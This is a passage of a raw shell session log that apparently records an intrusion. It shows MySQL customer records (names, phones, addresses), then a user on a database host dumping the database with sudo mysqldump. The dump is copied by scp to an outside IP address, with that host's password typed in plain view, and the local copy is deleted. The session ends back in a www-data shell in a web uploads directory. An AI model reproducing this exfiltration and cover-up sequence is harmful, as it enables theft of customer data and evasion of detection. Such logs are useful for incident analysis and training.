|            398 | Tokyo Collectables, Ltd            | 1621       | Shimamura       | Akiko            | +81 3 3584 0555    | 2-2-8 Roppongi                   | NULL                     | Minato-ku         | Tokyo         | 106-0032   | Japan        | 94400.00     |
|            406 | Auto Canal+ Petit                  | 1337       | Perrier         | Dominique        | (1) 47.55.6555     | 25, rue Lauriston                | NULL                     | Paris             | NULL          | 75016      | France       | 95000.00     |
|            409 | Stuttgart Collectable Exchange     | NULL       | M..ller          | Rita             | 0711-555361        | Adenauerallee 900                | NULL                     | Stuttgart         | NULL          | 70563      | Germany      | 0.00         |
|            412 | Extreme Desk Decorations, Ltd      | 1612       | McRoy           | Sarah            | 04 499 9555        | 101 Lambton Quay                 | Level 11                 | Wellington        | NULL          | NULL       | New Zealand  | 86800.00     |
|            415 | Bavarian Collectables Imports, Co. | 1504       | Donnermeyer     | Michael          |  +49 89 61 08 9555 | Hansastr. 15                     | NULL                     | Munich            | NULL          | 80686      | Germany      | 77000.00     |
|            424 | Classic Legends Inc.               | 1286       | Hernandez       | Maria            | 2125558493         | 5905 Pompton St.                 | Suite 750                | NYC               | NY            | 10022      | USA          | 67500.00     |
|            443 | Feuer Online Stores, Inc           | NULL       | Feuer           | Alexander        | 0342-555176        | Heerstr. 22                      | NULL                     | Leipzig           | NULL          | 04179      | Germany      | 0.00         |
|            447 | Gift Ideas Corp.                   | 1323       | Lewis           | Dan              | 2035554407         | 2440 Pompton St.                 | NULL                     | Glendale          | CT            | 97561      | USA          | 49700.00     |
|            448 | Scandinavian Gift Ideas            | 1504       | Larsson         | Martha           | 0695-34 6555       | ..kergatan 24                     | NULL                     | Br..cke            | NULL          | S-844 67   | Sweden       | 116400.00    |
|            450 | The Sharp Gifts Warehouse          | 1165       | Frick           | Sue              | 4085553659         | 3086 Ingle Ln.                   | NULL                     | San Jose          | CA            | 94217      | USA          | 77600.00     |
|            452 | Mini Auto Werke                    | 1401       | Mendel          | Roland           | 7675-3555          | Kirchgasse 6                     | NULL                     | Graz              | NULL          | 8010       | Austria      | 45300.00     |
|            455 | Super Scale Inc.                   | 1286       | Murphy          | Leslie           | 2035559545         | 567 North Pendale Street         | NULL                     | New Haven         | CT            | 97823      | USA          | 95400.00     |
|            456 | Microscale Inc.                    | 1286       | Choi            | Yu               | 2125551957         | 5290 North Pendale Street        | Suite 200                | NYC               | NY            | 10022      | USA          | 39800.00     |
|            458 | Corrida Auto Replicas, Ltd         | 1702       | Sommer          | Mart..n           | (91) 555 22 82     | C/ Araquil, 67                   | NULL                     | Madrid            | NULL          | 28023      | Spain        | 104600.00    |
|            459 | Warburg Exchange                   | NULL       | Ottlieb         | Sven             | 0241-039123        | Walserweg 21                     | NULL                     | Aachen            | NULL          | 52066      | Germany      | 0.00         |
|            462 | FunGiftIdeas.com                   | 1216       | Benitez         | Violeta          | 5085552555         | 1785 First Street                | NULL                     | New Bedford       | MA            | 50553      | USA          | 85800.00     |
|            465 | Anton Designs, Ltd.                | NULL       | Anton           | Carmen           | +34 913 728555     | c/ Gobelas, 19-1 Urb. La Florida | NULL                     | Madrid            | NULL          | 28023      | Spain        | 0.00         |
|            471 | Australian Collectables, Ltd       | 1611       | Clenahan        | Sean             | 61-9-3844-6555     | 7 Allen Street                   | NULL                     | Glen Waverly      | Victoria      | 3150       | Australia    | 60300.00     |
|            473 | Frau da Collezione                 | 1401       | Ricotti         | Franco           | +39 022515555      | 20093 Cologno Monzese            | Alessandro Volta 16      | Milan             | NULL          | NULL       | Italy        | 34800.00     |
|            475 | West Coast Collectables Co.        | 1166       | Thompson        | Steve            | 3105553722         | 3675 Furth Circle                | NULL                     | Burbank           | CA            | 94019      | USA          | 55400.00     |
|            477 | Mit Vergn..gen & Co.                | NULL       | Moos            | Hanna            | 0621-08555         | Forsterstr. 57                   | NULL                     | Mannheim          | NULL          | 68306      | Germany      | 0.00         |
|            480 | Kremlin Collectables, Co.          | NULL       | Semenov         | Alexander        | +7 812 293 0521    | 2 Pobedy Square                  | NULL                     | Saint Petersburg  | NULL          | 196143     | Russia       | 0.00         |
|            481 | Raanan Stores, Inc                 | NULL       | Altagar,G M     | Raanan           | + 972 9 959 8555   | 3 Hagalim Blv.                   | NULL                     | Herzlia           | NULL          | 47625      | Israel       | 0.00         |
|            484 | Iberia Gift Imports, Corp.         | 1702       | Roel            | Jos.. Pedro       | (95) 555 82 82     | C/ Romero, 33                    | NULL                     | Sevilla           | NULL          | 41101      | Spain        | 65700.00     |
|            486 | Motor Mint Distributors Inc.       | 1323       | Salazar         | Rosa             | 2155559857         | 11328 Douglas Av.                | NULL                     | Philadelphia      | PA            | 71270      | USA          | 72600.00     |
|            487 | Signal Collectibles Ltd.           | 1165       | Taylor          | Sue              | 4155554312         | 2793 Furth Circle                | NULL                     | Brisbane          | CA            | 94217      | USA          | 60300.00     |
|            489 | Double Decker Gift Stores, Ltd     | 1501       | Smith           | Thomas           | (171) 555-7555     | 120 Hanover Sq.                  | NULL                     | London            | NULL          | WA1 1DP    | UK           | 43300.00     |
|            495 | Diecast Collectables               | 1188       | Franco          | Valarie          | 6175552555         | 6251 Ingle Ln.                   | NULL                     | Boston            | MA            | 51003      | USA          | 85100.00     |
|            496 | Kelly's Gift Shop                  | 1612       | Snowden         | Tony             | +64 9 5555500      | Arenales 1938 3'A'               | NULL                     | Auckland          | NULL          | NULL       | New Zealand  | 110000.00    |
+----------------+------------------------------------+------------+-----------------+------------------+--------------------+----------------------------------+--------------------------+-------------------+---------------+------------+--------------+--------------+
122 rows in set (0.00 sec)

mysql> SELECT * FROM customers LIMIT 5;
SELECT * FROM customers LIMIT 5;
+----------------+----------------------------+------------+-----------------+------------------+--------------+------------------------------+--------------+-----------+----------+------------+-----------+--------------+
| customerNumber | customerName               | customerId | contactLastName | contactFirstName | phone        | addressLine1                 | addressLine2 | city      | state    | postalCode | country   | amount_spent |
+----------------+----------------------------+------------+-----------------+------------------+--------------+------------------------------+--------------+-----------+----------+------------+-----------+--------------+
|            103 | Atelier graphique          | 1370       | Schmitt         | Carine           | 40.32.2555   | 54, rue Royale               | NULL         | Nantes    | NULL     | 44000      | France    | 21000.00     |
|            112 | Signal Gift Stores         | 1166       | King            | Jean             | 7025551838   | 8489 Strong St.              | NULL         | Las Vegas | NV       | 83030      | USA       | 71800.00     |
|            114 | Australian Collectors, Co. | 1611       | Ferguson        | Peter            | 03 9520 4555 | 636 St Kilda Road            | Level 3      | Melbourne | Victoria | 3004       | Australia | 117300.00    |
|            119 | La Rochelle Gifts          | 1370       | Labrune         | Janine           | 40.67.8555   | 67, rue des Cinquante Otages | NULL         | Nantes    | NULL     | 44000      | France    | 118200.00    |
|            121 | Baane Mini Imports         | 1504       | Bergulfsen      | Jonas            | 07-98 9555   | Erling Skakkes gate 78       | NULL         | Stavern   | NULL     | 4110       | Norway    | 81700.00     |
+----------------+----------------------------+------------+-----------------+------------------+--------------+------------------------------+--------------+-----------+----------+------------+-----------+--------------+
5 rows in set (0.00 sec)

mysql> exit;
exit;
Bye
phl@database:~$ sudo mysqldump -u root -p phl > phl.db
sudo mysqldump -u root -p phl > phl.db
Enter password: 

phl@database:~$ file phl.db
file phl.db
phl.db: UTF-8 Unicode text, with very long lines
phl@database:~$ head -50 phl.db
head -50 phl.db
-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
--
-- Host: localhost    Database: phl
-- ------------------------------------------------------
-- Server version	8.0.28-0ubuntu0.20.04.3

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `customers`
--

DROP TABLE IF EXISTS `customers`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `customers` (
  `customerNumber` int NOT NULL,
  `customerName` varchar(50) NOT NULL,
  `customerId` varchar(50) DEFAULT NULL,
  `contactLastName` varchar(50) NOT NULL,
  `contactFirstName` varchar(50) NOT NULL,
  `phone` varchar(50) NOT NULL,
  `addressLine1` varchar(50) NOT NULL,
  `addressLine2` varchar(50) DEFAULT NULL,
  `city` varchar(50) NOT NULL,
  `state` varchar(50) DEFAULT NULL,
  `postalCode` varchar(15) DEFAULT NULL,
  `country` varchar(50) NOT NULL,
  `amount_spent` varchar(50) NOT NULL,
  PRIMARY KEY (`customerNumber`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `customers`
--

LOCK TABLES `customers` WRITE;
/*!40000 ALTER TABLE `customers` DISABLE KEYS */;
INSERT INTO `customers` VALUES (103,'Atelier graphique','1370','Schmitt','Carine ','40.32.2555','54, rue Royale',NULL,'Nantes',NULL,'44000','France','21000.00'),(112,'Signal Gift Stores','1166','King','Jean','7025551838','8489 Strong St.',NULL,'Las Vegas','NV','83030','USA','71800.00'),(114,'Australian Collectors, Co.','1611','Ferguson','Peter','03 9520 4555','636 St Kilda Road','Level 3','Melbourne','Victoria','3004','Australia','117300.00'),(119,'La Rochelle Gifts','1370','Labrune','Janine ','40.67.8555','67, rue des Cinquante Otages',NULL,'Nantes',NULL,'44000','France','118200.00'),(121,'Baane Mini Imports','1504','Bergulfsen','Jonas ','07-98 9555','Erling Skakkes gate 78',NULL,'Stavern',NULL,'4110','Norway','81700.00'),(124,'Mini Gifts Distributors Ltd.','1165','Nelson','Susan','4155551450','5677 Strong St.',NULL,'San Rafael','CA','97562','USA','210500.00'),(125,'Havel & Zbyszek Co',NULL,'Piestrzeniewicz','Zbyszek ','(26) 642-7555','ul. Filtrowa 68',NULL,'Warszawa',NULL,'01-012','Poland','0.00'),(128,'Blauer See Auto, Co.','1504','Keitel','Roland','+49 69 66 90 2555','Lyonerstr. 34',NULL,'Frankfurt',NULL,'60528','Germany','59700.00'),(129,'Mini Wheels Co.','1165','Murphy','Julie','6505555787','5557 North Pendale Street',NULL,'San Francisco','CA','94217','USA','64600.00'),(131,'Land of Toys Inc.','1323','Lee','Kwai','2125557818','897 Long Airport Avenue',NULL,'NYC','NY','10022','USA','114900.00'),(141,'Euro+ Shopping Channel','1370','Freyre','Diego ','(91) 555 94 44','C/ Moralzarzal, 86',NULL,'Madrid',NULL,'28034','Spain','227600.00'),(144,'Volvo Model Replicas, Co','1504','Berglund','Christina ','0921-12 3555','Berguvsv..gen  8',NULL,'Lule..',NULL,'S-958 22','Sweden','53100.00'),(145,'Danish Wholesale Imports','1401','Petersen','Jytte ','31 12 3555','Vinb..ltet 34',NULL,'Kobenhavn',NULL,'1734','Denmark','83400.00'),(146,'Saveley & Henriot, Co.','1337','Saveley','Mary ','78.32.5555','2, rue du Commerce',NULL,'Lyon',NULL,'69004','France','123900.00'),(148,'Dragon Souveniers, Ltd.','1621','Natividad','Eric','+65 221 7555','Bronz Sok.','Bronz Apt. 3/6 Tesvikiye','Singapore',NULL,'079903','Singapore','103800.00'),(151,'Muscle Machine Inc','1286','Young','Jeff','2125557413','4092 Furth Circle','Suite 400','NYC','NY','10022','USA','138500.00'),(157,'Diecast Classics Inc.','1216','Leong','Kelvin','2155551555','7586 Pompton St.',NULL,'Allentown','PA','70267','USA','100600.00'),(161,'Technics Stores Inc.','1165','Hashimoto','Juri','6505556809','9408 Furth Circle',NULL,'Burlingame','CA','94217','USA','84600.00'),(166,'Handji Gifts& Co','1612','Victorino','Wendy','+65 224 1555','106 Linden Road Sandown','2nd Floor','Singapore',NULL,'069045','Singapore','97900.00'),(167,'Herkku Gifts','1504','Oeztan','Veysel','+47 2267 3215','Brehmen St. 121','PR 334 Sentrum','Bergen',NULL,'N 5804','Norway  ','96800.00'),(168,'American Souvenirs Inc','1286','Franco','Keith','2035557845','149 Spinnaker Dr.','Suite 101','New Haven','CT','97823','USA','0.00'),(169,'Porto Imports Co.',NULL,'de Castro','Isabel ','(1) 356-5555','Estrada da sa..de n. 58',NULL,'Lisboa',NULL,'1756','Portugal','0.00'),(171,'Daedalus Designs Imports','1370','Ranc..','Martine ','20.16.1555','184, chauss..e de Tournai',NULL,'Lille',NULL,'59000','France','82900.00'),(172,'La Corne D\'abondance, Co.','1337','Bertrand','Marie','(1) 42.34.2555','265, boulevard Charonne',NULL,'Paris',NULL,'75012','France','84300.00'),(173,'Cambridge Collectables Co.','1188','Tseng','Jerry','6175555555','4658 Baden Av.',NULL,'Cambridge','MA','51247','USA','43400.00'),(175,'Gift Depot Inc.','1323','King','Julie','2035552570','25593 South Bay Ln.',NULL,'Bridgewater','CT','97562','USA','84300.00'),(177,'Osaka Souveniers Co.','1621','Kentary','Mory','+81 06 6342 5555','1-6-20 Dojima',NULL,'Kita-ku','Osaka',' 530-0003','Japan','81200.00'),(181,'Vitachrome Inc.','1286','Frick','Michael','2125551500','2678 Kingston Rd.','Suite 101','NYC','NY','10022','USA','76400.00'),(186,'Toys of Finland, Co.','1501','Karttunen','Matti','90-224 8555','Keskuskatu 45',NULL,'Helsinki',NULL,'21240','Finland','96500.00'),(187,'AV Stores, Co.','1501','Ashworth','Rachel','(171) 555-1555','Fauntleroy Circus',NULL,'Manchester',NULL,'EC2 5NT','UK','136800.00'),(189,'Clover Collections, Co.','1504','Cassidy','Dean','+353 1862 1555','25 Maiden Lane','Floor No. 4','Dublin',NULL,'2','Ireland','69400.00'),(198,'Auto-Moto Classics Inc.','1216','Taylor','Leslie','6175558428','16780 Pompton St.',NULL,'Brickhaven','MA','58339','USA','23000.00'),(201,'UK Collectables, Ltd.','1501','Devon','Elizabeth','(171) 555-2282','12, Berkeley Gardens Blvd',NULL,'Liverpool',NULL,'WX1 6LT','UK','92700.00'),(202,'Canadian Gift Exchange Network','1323','Tamuri','Yoshi ','(604) 555-3392','1900 Oak St.',NULL,'Vancouver','BC','V3F 2K1','Canada','90300.00'),(204,'Online Mini Collectables','1188','Barajas','Miguel','6175557555','7635 Spinnaker Dr.',NULL,'Brickhaven','MA','58339','USA','68700.00'),(205,'Toys4GrownUps.com','1166','Young','Julie','6265557265','78934 Hillside Dr.',NULL,'Pasadena','CA','90003','USA','90700.00'),(206,'Asian Shopping Network, Co',NULL,'Walker','Brydey','+612 9411 1555','Suntec Tower Three','8 Temasek','Singapore',NULL,'038988','Singapore','0.00'),(209,'Mini Caravy','1370','Citeaux','Fr..d..rique ','88.60.1555','24, place Kl..ber',NULL,'Strasbourg',NULL,'67000','France','53800.00'),(211,'King Kong Collectables, Co.','1621','Gao','Mike','+852 2251 1555','Bank of China Tower','1 Garden Road','Central Hong Kong',NULL,NULL,'Hong Kong','58600.00'),(216,'Enaco Distributors','1702','Saavedra','Eduardo ','(93) 203 4555','Rambla de Catalu..a, 23',NULL,'Barcelona',NULL,'08022','Spain','60300.00'),(219,'Boards & Toys Co.','1166','Young','Mary','3105552373','4097 Douglas Av.',NULL,'Glendale','CA','92561','USA','11000.00'),(223,'Nat..rlich Autos',NULL,'Kloss','Horst ','0372-555188','Taucherstra..e 10',NULL,'Cunewalde',NULL,'01307','Germany','0.00'),(227,'Heintze Collectables','1401','Ibsen','Palle','86 21 3555','Smagsloget 45',NULL,'..rhus',NULL,'8200','Denmark','120800.00'),(233,'Qu..bec Home Shopping Network','1286','Fresni..re','Jean ','(514) 555-8054','43 rue St. Laurent',NULL,'Montr..al','Qu..bec','H1J 1C3','Canada','48700.00'),(237,'ANG Resellers',NULL,'Camino','Alejandra ','(91) 745 6555','Gran V..a, 1',NULL,'Madrid',NULL,'28001','Spain','0.00'),(239,'Collectable Mini Designs Co.','1166','Thompson','Valarie','7605558146','361 Furth Circle',NULL,'San Diego','CA','91217','USA','105000.00'),(240,'giftsbymail.co.uk','1501','Bennett','Helen ','(198) 555-8888','Garden House','Crowther Way 23','Cowes','Isle of Wight','PO31 7PJ','UK','93900.00'),(242,'Alpha Cognac','1370','Roulet','Annette ','61.77.6555','1 rue Alsace-Lorraine',NULL,'Toulouse',NULL,'31000','France','61100.00'),(247,'Messner Shopping Network',NULL,'Messner','Renate ','069-0555984','Magazinweg 7',NULL,'Frankfurt',NULL,'60528','Germany','0.00'),(249,'Amica Models & Co.','1401','Accorti','Paolo ','011-4988555','Via Monte Bianco 34',NULL,'Torino',NULL,'10100','Italy','113000.00'),(250,'Lyon Souveniers','1337','Da Silva','Daniel','+33 1 46 62 7555','27 rue du Colonel Pierre Avia',NULL,'Paris',NULL,'75508','France','68100.00'),(256,'Auto Associ..s & Cie.','1370','Tonini','Daniel ','30.59.8555','67, avenue de l\'Europe',NULL,'Versailles',NULL,'78000','France','77900.00'),(259,'Toms Spezialit..ten, Ltd','1504','Pfalzheim','Henriette ','0221-5554327','Mehrheimerstr. 369',NULL,'K..ln',NULL,'50739','Germany','120400.00'),(260,'Royal Canadian Collectables, Ltd.','1323','Lincoln','Elizabeth ','(604) 555-4555','23 Tsawassen Blvd.',NULL,'Tsawassen','BC','T2F 8M4','Canada','89600.00'),(273,'Franken Gifts, Co',NULL,'Franken','Peter ','089-0877555','Berliner Platz 43',NULL,'M..nchen',NULL,'80805','Germany','0.00'),(276,'Anna\'s Decorations, Ltd','1611','O\'Hara','Anna','02 9936 8555','201 Miller Street','Level 15','North Sydney','NSW','2060','Australia','107800.00'),(278,'Rovelli Gifts','1401','Rovelli','Giovanni ','035-640555','Via Ludovico il Moro 22',NULL,'Bergamo',NULL,'24100','Italy','119600.00'),(282,'Souveniers And Things Co.','1611','Huxley','Adrian','+61 2 9495 8555','Monitor Money Building','815 Pacific Hwy','Chatswood','NSW','2067','Australia','93300.00'),(286,'Marta\'s Replicas Co.','1216','Hernandez','Marta','6175558555','39323 Spinnaker Dr.',NULL,'Cambridge','MA','51247','USA','123700.00'),(293,'BG&E Collectables',NULL,'Harrison','Ed','+41 26 425 50 01','Rte des Arsenaux 41 ',NULL,'Fribourg',NULL,'1700','Switzerland','0.00'),(298,'Vida Sport, Ltd','1702','Holz','Mihael','0897-034555','Grenzacherweg 237',NULL,'Gen..ve',NULL,'1203','Switzerland','141300.00'),(299,'Norway Gifts By Mail, Co.','1504','Klaeboe','Jan','+47 2212 1555','Drammensveien 126A','PB 211 Sentrum','Oslo',NULL,'N 0106','Norway  ','95100.00'),(303,'Schuyler Imports',NULL,'Schuyler','Bradley','+31 20 491 9555','Kingsfordweg 151',NULL,'Amsterdam',NULL,'1043 GR','Netherlands','0.00'),(307,'Der Hund Imports',NULL,'Andersen','Mel','030-0074555','Obere Str. 57',NULL,'Berlin',NULL,'12209','Germany','0.00'),(311,'Oulu Toy Supplies, Inc.','1501','Koskitalo','Pirkko','981-443655','Torikatu 38',NULL,'Oulu',NULL,'90110','Finland','90500.00'),(314,'Petit Auto','1401','Dewey','Catherine ','(02) 5554 67','Rue Joseph-Bens 532',NULL,'Bruxelles',NULL,'B-1180','Belgium','79900.00'),(319,'Mini Classics','1323','Frick','Steve','9145554562','3758 North Pendale Street',NULL,'White Plains','NY','24067','USA','102700.00'),(320,'Mini Creations Ltd.','1188','Huang','Wing','5085559555','4575 Hillside Dr.',NULL,'New Bedford','MA','50553','USA','94500.00'),(321,'Corporate Gift Ideas Co.','1165','Brown','Julie','6505551386','7734 Strong St.',NULL,'San Francisco','CA','94217','USA','105000.00'),(323,'Down Under Souveniers, Inc','1612','Graham','Mike','+64 9 312 5555','162-164 Grafton Road','Level 2','Auckland  ',NULL,NULL,'New Zealand','88000.00'),(324,'Stylish Desk Decors, Co.','1501','Brown','Ann ','(171) 555-0297','35 King George',NULL,'London',NULL,'WX3 6FW','UK','77000.00'),(328,'Tekni Collectables Inc.','1323','Brown','William','2015559350','7476 Moss Rd.',NULL,'Newark','NJ','94019','USA','43000.00'),(333,'Australian Gift Network, Co','1611','Calaghan','Ben','61-7-3844-6555','31 Duncan St. West End',NULL,'South Brisbane','Queensland','4101','Australia','51600.00'),(334,'Suominen Souveniers','1501','Suominen','Kalle','+358 9 8045 555','Software Engineering Center','SEC Oy','Espoo',NULL,'FIN-02271','Finland','98800.00'),(335,'Cramer Spezialit..ten, Ltd',NULL,'Cramer','Philip ','0555-09555','Maubelstr. 90',NULL,'Brandenburg',NULL,'14776','Germany','0.00'),(339,'Classic Gift Ideas, Inc','1188','Cervantes','Francisca','2155554695','782 First Street',NULL,'Philadelphia','PA','71270','USA','81100.00'),(344,'CAF Imports','1702','Fernandez','Jesus','+34 913 728 555','Merchants House','27-30 Merchant\'s Quay','Madrid',NULL,'28023','Spain','59600.00'),(347,'Men \'R\' US Retailers, Ltd.','1166','Chandler','Brian','2155554369','6047 Douglas Av.',NULL,'Los Angeles','CA','91003','USA','57700.00'),(348,'Asian Treasures, Inc.',NULL,'McKenna','Patricia ','2967 555','8 Johnstown Road',NULL,'Cork','Co. Cork',NULL,'Ireland','0.00'),(350,'Marseille Mini Autos','1337','Lebihan','Laurence ','91.24.4555','12, rue des Bouchers',NULL,'Marseille',NULL,'13008','France','65000.00'),(353,'Reims Collectables','1337','Henriot','Paul ','26.47.1555','59 rue de l\'Abbaye',NULL,'Reims',NULL,'51100','France','81100.00'),(356,'SAR Distributors, Co',NULL,'Kuger','Armand','+27 21 550 3555','1250 Pretorius Street',NULL,'Hatfield','Pretoria','0028','South Africa','0.00'),(357,'GiftsForHim.com','1612','MacKinlay','Wales','64-9-3763555','199 Great North Road',NULL,'Auckland',NULL,NULL,'New Zealand','77700.00'),(361,'Kommission Auto',NULL,'Josephs','Karin','0251-555259','Luisenstr. 48',NULL,'M..nster',NULL,'44087','Germany','0.00'),(362,'Gifts4AllAges.com','1216','Yoshido','Juri','6175559555','8616 Spinnaker Dr.',NULL,'Boston','MA','51003','USA','41900.00'),(363,'Online Diecast Creations Co.','1216','Young','Dorothy','6035558647','2304 Long Airport Avenue',NULL,'Nashua','NH','62005','USA','114200.00'),(369,'Lisboa Souveniers, Inc',NULL,'Rodriguez','Lino ','(1) 354-2555','Jardim das rosas n. 32',NULL,'Lisboa',NULL,'1675','Portugal','0.00'),(376,'Precious Collectables','1702','Urs','Braun','0452-076555','Hauptstr. 29',NULL,'Bern',NULL,'3012','Switzerland','0.00'),(379,'Collectables For Less Inc.','1188','Nelson','Allen','6175558555','7825 Douglas Av.',NULL,'Brickhaven','MA','58339','USA','70700.00'),(381,'Royale Belge','1401','Cartrain','Pascale ','(071) 23 67 2555','Boulevard Tirou, 255',NULL,'Charleroi',NULL,'B-6000','Belgium','23500.00'),(382,'Salzburg Collectables','1401','Pipps','Georg ','6562-9555','Geislweg 14',NULL,'Salzburg',NULL,'5020','Austria','71700.00'),(385,'Cruz & Sons Co.','1621','Cruz','Arnold','+63 2 555 3587','15 McCallum Street','NatWest Center #13-03','Makati City',NULL,'1227 MM','Philippines','81500.00'),(386,'L\'ordine Souveniers','1401','Moroni','Maurizio ','0522-556555','Strada Provinciale 124',NULL,'Reggio Emilia',NULL,'42100','Italy','121400.00'),(398,'Tokyo Collectables, Ltd','1621','Shimamura','Akiko','+81 3 3584 0555','2-2-8 Roppongi',NULL,'Minato-ku','Tokyo','106-0032','Japan','94400.00'),(406,'Auto Canal+ Petit','1337','Perrier','Dominique','(1) 47.55.6555','25, rue Lauriston',NULL,'Paris',NULL,'75016','France','95000.00'),(409,'Stuttgart Collectable Exchange',NULL,'M..ller','Rita ','0711-555361','Adenauerallee 900',NULL,'Stuttgart',NULL,'70563','Germany','0.00'),(412,'Extreme Desk Decorations, Ltd','1612','McRoy','Sarah','04 499 9555','101 Lambton Quay','Level 11','Wellington',NULL,NULL,'New Zealand','86800.00'),(415,'Bavarian Collectables Imports, Co.','1504','Donnermeyer','Michael',' +49 89 61 08 9555','Hansastr. 15',NULL,'Munich',NULL,'80686','Germany','77000.00'),(424,'Classic Legends Inc.','1286','Hernandez','Maria','2125558493','5905 Pompton St.','Suite 750','NYC','NY','10022','USA','67500.00'),(443,'Feuer Online Stores, Inc',NULL,'Feuer','Alexander ','0342-555176','Heerstr. 22',NULL,'Leipzig',NULL,'04179','Germany','0.00'),(447,'Gift Ideas Corp.','1323','Lewis','Dan','2035554407','2440 Pompton St.',NULL,'Glendale','CT','97561','USA','49700.00'),(448,'Scandinavian Gift Ideas','1504','Larsson','Martha','0695-34 6555','..kergatan 24',NULL,'Br..cke',NULL,'S-844 67','Sweden','116400.00'),(450,'The Sharp Gifts Warehouse','1165','Frick','Sue','4085553659','3086 Ingle Ln.',NULL,'San Jose','CA','94217','USA','77600.00'),(452,'Mini Auto Werke','1401','Mendel','Roland ','7675-3555','Kirchgasse 6',NULL,'Graz',NULL,'8010','Austria','45300.00'),(455,'Super Scale Inc.','1286','Murphy','Leslie','2035559545','567 North Pendale Street',NULL,'New Haven','CT','97823','USA','95400.00'),(456,'Microscale Inc.','1286','Choi','Yu','2125551957','5290 North Pendale Street','Suite 200','NYC','NY','10022','USA','39800.00'),(458,'Corrida Auto Replicas, Ltd','1702','Sommer','Mart..n ','(91) 555 22 82','C/ Araquil, 67',NULL,'Madrid',NULL,'28023','Spain','104600.00'),(459,'Warburg Exchange',NULL,'Ottlieb','Sven ','0241-039123','Walserweg 21',NULL,'Aachen',NULL,'52066','Germany','0.00'),(462,'FunGiftIdeas.com','1216','Benitez','Violeta','5085552555','1785 First Street',NULL,'New Bedford','MA','50553','USA','85800.00'),(465,'Anton Designs, Ltd.',NULL,'Anton','Carmen','+34 913 728555','c/ Gobelas, 19-1 Urb. La Florida',NULL,'Madrid',NULL,'28023','Spain','0.00'),(471,'Australian Collectables, Ltd','1611','Clenahan','Sean','61-9-3844-6555','7 Allen Street',NULL,'Glen Waverly','Victoria','3150','Australia','60300.00'),(473,'Frau da Collezione','1401','Ricotti','Franco','+39 022515555','20093 Cologno Monzese','Alessandro Volta 16','Milan',NULL,NULL,'Italy','34800.00'),(475,'West Coast Collectables Co.','1166','Thompson','Steve','3105553722','3675 Furth Circle',NULL,'Burbank','CA','94019','USA','55400.00'),(477,'Mit Vergn..gen & Co.',NULL,'Moos','Hanna ','0621-08555','Forsterstr. 57',NULL,'Mannheim',NULL,'68306','Germany','0.00'),(480,'Kremlin Collectables, Co.',NULL,'Semenov','Alexander ','+7 812 293 0521','2 Pobedy Square',NULL,'Saint Petersburg',NULL,'196143','Russia','0.00'),(481,'Raanan Stores, Inc',NULL,'Altagar,G M','Raanan','+ 972 9 959 8555','3 Hagalim Blv.',NULL,'Herzlia',NULL,'47625','Israel','0.00'),(484,'Iberia Gift Imports, Corp.','1702','Roel','Jos.. Pedro ','(95) 555 82 82','C/ Romero, 33',NULL,'Sevilla',NULL,'41101','Spain','65700.00'),(486,'Motor Mint Distributors Inc.','1323','Salazar','Rosa','2155559857','11328 Douglas Av.',NULL,'Philadelphia','PA','71270','USA','72600.00'),(487,'Signal Collectibles Ltd.','1165','Taylor','Sue','4155554312','2793 Furth Circle',NULL,'Brisbane','CA','94217','USA','60300.00'),(489,'Double Decker Gift Stores, Ltd','1501','Smith','Thomas ','(171) 555-7555','120 Hanover Sq.',NULL,'London',NULL,'WA1 1DP','UK','43300.00'),(495,'Diecast Collectables','1188','Franco','Valarie','6175552555','6251 Ingle Ln.',NULL,'Boston','MA','51003','USA','85100.00'),(496,'Kelly\'s Gift Shop','1612','Snowden','Tony','+64 9 5555500','Arenales 1938 3\'A\'',NULL,'Auckland  ',NULL,NULL,'New Zealand','110000.00');
/*!40000 ALTER TABLE `customers` ENABLE KEYS */;
phl@database:~$ ls
ls
phl.db
phl@database:~$ scp phl.db fierce@178.62.228.28:/tmp/phl.db
scp phl.db fierce@178.62.228.28:/tmp/phl.db

fierce@178.62.228.28's password: fierce123


phl.db                                          0%    0     0.0KB/s   --:-- ETA
phl.db                                        100%   19KB 105.9KB/s   00:00    
phl@database:~$ rm phl.db
rm phl.db
phl@database:~$ exit
exit
logout
Connection closed by foreign host.
www-data@webserver:/var/www/html/uploads$ exit
exit
exit
$ exit
